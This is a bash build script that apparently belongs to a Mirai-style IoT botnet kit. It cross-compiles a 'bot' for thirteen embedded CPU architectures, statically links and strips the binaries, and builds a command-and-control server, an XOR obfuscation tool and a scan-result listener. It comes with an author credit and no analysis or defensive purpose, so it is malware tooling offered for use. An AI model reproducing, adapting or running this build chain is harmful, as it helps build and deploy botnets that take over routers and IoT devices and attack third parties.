#!/bin/bash

export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv5l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/armv7l/bin
export PATH=$PATH:/etc/xcompile/x86_64/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/sparc/bin
export PATH=$PATH:/etc/xcompile/i686/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin

function compile_bot {
    "$1-gcc" -std=c99 -static bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2"
    "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt $3
    echo -ne "\033[37;1mfinished compiling \033[31;1m[\033[37;1m$1\033[31;1m] \033[37;1mfor binary \033[31;1m[\033[37;1m$2\033[31;1m]\033[0m\r\n"
}

if [ $# == 0 ]; then
    echo "Usage: $0 <debug | release>"
elif [ "$1" == "debug" ]; then
	rm debug/*
    gcc -std=c99 bot/*.c -DDEBUG -static -g -o debug/dbg
    echo -ne "\033[37;1mfinished compiling \033[31;1m[\033[37;1mdbg\033[31;1m]\r\n"
    gcc -std=c99 tools/xor.c -g -o debug/xor
    echo -ne "\033[37;1mfinished compiling \033[31;1m[\033[37;1mxor\033[31;1m]\r\n"
    g++ cnc/*.cpp -s -Os -o debug/cnc -lpthread
    echo -ne "\033[37;1mfinished compiling \033[31;1m[\033[37;1mcnc\033[31;1m]\r\n"
    go build -o debug/scanListen tools/scanListen.go >/dev/null
    echo -ne "\033[37;1mfinished compiling \033[31;1m[\033[37;1mscanListen\033[31;1m]\r\n"
elif [ "$1" == "release" ]; then
    rm release/*
    compile_bot armv4l arm "--remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr"
    compile_bot armv5l arm5 "--remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr"
    compile_bot armv7l arm7 ""
    compile_bot mips mips "--remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr"
    compile_bot mipsel mipsel "--remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr"
    compile_bot powerpc powerpc "--remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr"
    compile_bot sh4 sh4 "--remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr"
    compile_bot m68k m68k "--remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr"
    compile_bot sparc sparc "--remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr"
    compile_bot i686 i686 "--remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr"
    compile_bot i586 x86_32 "--remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr"
    compile_bot x86_64 x86_64 "--remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr"
else
    echo "Unknown parameter $1: $0 <debug | release>"
fi

echo -e "made by franco and wicked with ton of love <3"
